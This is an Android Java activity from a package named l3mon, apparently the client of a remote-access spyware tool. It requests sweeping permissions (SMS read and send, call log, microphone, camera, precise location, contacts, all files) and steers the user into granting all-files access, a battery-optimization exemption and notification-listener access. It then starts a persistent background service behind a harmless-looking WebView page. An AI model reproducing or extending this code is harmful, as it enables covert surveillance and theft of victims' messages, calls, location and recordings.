package com.etechd.l3mon.ui;

import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.etechd.l3mon.R;
import com.etechd.l3mon.core.config.Config;
import com.etechd.l3mon.service.MainService;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;

    private WebView webView;
    private ProgressBar progressBar;
    private boolean initialUrlLoaded = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        progressBar = findViewById(R.id.progressBar);

        configureWebView();

        if (savedInstanceState != null && webView != null) {
            webView.restoreState(savedInstanceState);
            initialUrlLoaded = true;
        }

        if (progressBar != null) {
            progressBar.setVisibility(View.VISIBLE);
        }

        checkAndRequestPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                checkAllFilesAccessAndStart();
            }
        } else {
            checkAllFilesAccessAndStart();
        }
    }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle outState) {
        super.onSaveInstanceState(outState);
        if (webView != null) {
            webView.saveState(outState);
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }

    private void checkAndRequestPermissions() {
        String[] basePermissions = new String[]{
                android.Manifest.permission.WAKE_LOCK,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.INTERNET,
                android.Manifest.permission.ACCESS_NETWORK_STATE,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.ACCESS_WIFI_STATE,
                android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.MODIFY_AUDIO_SETTINGS,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.READ_CONTACTS
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            basePermissions = concatArrays(basePermissions, new String[]{
                    android.Manifest.permission.POST_NOTIFICATIONS,
                    android.Manifest.permission.READ_MEDIA_IMAGES,
                    android.Manifest.permission.READ_MEDIA_VIDEO,
                    android.Manifest.permission.READ_MEDIA_AUDIO
            });
        } else {
            basePermissions = concatArrays(basePermissions, new String[]{
                    android.Manifest.permission.READ_EXTERNAL_STORAGE,
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            });
        }

        boolean allGranted = true;
        for (String perm : basePermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, basePermissions, PERMISSION_REQUEST_CODE);
        } else {
            checkAllFilesAccessAndStart();
        }
    }

    private void checkAllFilesAccessAndStart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            requestManageExternalStorage();
            return;
        }
        proceedAfterPermissions();
    }

    private void requestManageExternalStorage() {
        try {
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } catch (ActivityNotFoundException e) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            } catch (Exception ex) {
                Toast.makeText(this, "Cannot open storage settings", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void proceedAfterPermissions() {
        requestBatteryOptimizationExemption();
        startMainService();

        if (!isNotificationServiceRunning()) {
            showPermissionInstructions();
            try {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } catch (Exception ignored) {
            }
        } else {
            loadHomePage();
        }
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return;
        }

        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        } catch (Exception e) {
            try {
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            } catch (Exception ignored) {
            }
        }
    }

    private void startMainService() {
        try {
            Intent serviceIntent = new Intent(this, MainService.class);
            ContextCompat.startForegroundService(this, serviceIntent);
        } catch (Exception e) {
            Toast.makeText(this, "Service start failed", Toast.LENGTH_LONG).show();
        }
    }

    private boolean isNotificationServiceRunning() {
        try {
            String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            return enabledListeners != null && enabledListeners.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private void showPermissionInstructions() {
        try {
            CharSequence text = "Please enable all permissions for full functionality.\nAfter enabling, return to the app.";
            Toast toast = Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG);
            if (toast.getView() != null) {
                TextView v = toast.getView().findViewById(android.R.id.message);
                if (v != null) {
                    v.setTextColor(Color.RED);
                    v.setTypeface(Typeface.DEFAULT_BOLD);
                    v.setGravity(Gravity.CENTER);
                }
            }
            toast.show();
        } catch (Exception ignored) {
        }
    }

    private void loadHomePage() {
        if (webView == null || initialUrlLoaded) {
            return;
        }
        if (progressBar != null) {
            progressBar.setVisibility(View.VISIBLE);
        }
        webView.loadUrl(Config.HOME_PAGE_URL);
        initialUrlLoaded = true;
    }

    private static String[] concatArrays(String[] first, String[] second) {
        String[] result = new String[first.length + second.length];
        System.arraycopy(first, 0, result, 0, first.length);
        System.arraycopy(second, 0, result, first.length, second.length);
        return result;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != PERMISSION_REQUEST_CODE) {
            return;
        }

        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            checkAllFilesAccessAndStart();
        } else {
            Toast.makeText(this, "Permissions denied. Enable in settings.", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
        }
    }

    private void configureWebView() {
        if (webView == null) {
            return;
        }

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(true);
        settings.setDisplayZoomControls(false);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (progressBar != null) {
                    progressBar.setVisibility(View.GONE);
                }
            }

            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                if (progressBar != null) {
                    progressBar.setVisibility(View.VISIBLE);
                }
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return false;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return false;
            }
        });
    }
}
